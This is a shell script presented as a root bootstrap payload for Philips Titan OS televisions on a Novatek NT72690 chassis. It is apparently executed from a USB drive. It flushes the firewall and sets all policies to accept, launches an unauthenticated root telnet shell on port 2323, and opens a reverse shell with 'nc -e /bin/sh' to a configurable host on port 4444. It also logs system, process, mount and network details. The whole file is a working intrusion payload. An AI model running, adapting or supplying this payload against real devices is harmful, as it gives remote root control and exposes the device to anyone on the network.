#!/bin/sh
# Philips Titan OS Root Bootstrap Payload
# Target: Novatek NT72690 (Chassis TPA256E / TPN256E)

HOST_IP="${HOST_IP:-192.0.2.44}"
PORT="4444"
LOG_DIR="$(dirname "$0")"
LOG_FILE="$LOG_DIR/bootstrap.log"

echo "=== [BOOTSTRAP] Titan OS Root Hook Executed ===" > "$LOG_FILE"
echo "Timestamp: $(date 2>/dev/null || cat /proc/uptime)" >> "$LOG_FILE"
echo "Kernel: $(uname -a 2>/dev/null)" >> "$LOG_FILE"
echo "CMDLINE: $(cat /proc/cmdline 2>/dev/null)" >> "$LOG_FILE"
echo "ID: $(id 2>/dev/null)" >> "$LOG_FILE"

# 1. Flush inbound firewall rules to allow local telnet/SSH
iptables -F 2>/dev/null
iptables -X 2>/dev/null
iptables -P INPUT ACCEPT 2>/dev/null
iptables -P FORWARD ACCEPT 2>/dev/null
iptables -P OUTPUT ACCEPT 2>/dev/null

# 2. Launch persistent local root telnet daemon on port 2323
if command -v busybox >/dev/null 2>&1; then
    busybox telnetd -p 2323 -l /bin/sh 2>/dev/null &
elif command -v telnetd >/dev/null 2>&1; then
    telnetd -p 2323 -l /bin/sh 2>/dev/null &
fi

# 3. Establish outbound reverse shell to workstation
if command -v nc >/dev/null 2>&1; then
    nc -e /bin/sh "$HOST_IP" "$PORT" 2>/dev/null &
elif command -v busybox >/dev/null 2>&1; then
    busybox nc "$HOST_IP" "$PORT" -e /bin/sh 2>/dev/null &
fi

# 4. Dump system process and mount state to USB log
ps aux > "$LOG_DIR/ps.log" 2>/dev/null || ps > "$LOG_DIR/ps.log" 2>/dev/null
cat /proc/mounts > "$LOG_DIR/mounts.log" 2>/dev/null
cat /proc/partitions > "$LOG_DIR/partitions.log" 2>/dev/null
ifconfig > "$LOG_DIR/ifconfig.log" 2>/dev/null || ip a > "$LOG_DIR/ifconfig.log" 2>/dev/null

echo "=== [BOOTSTRAP] Initialization Finished ===" >> "$LOG_FILE"
sync 2>/dev/null
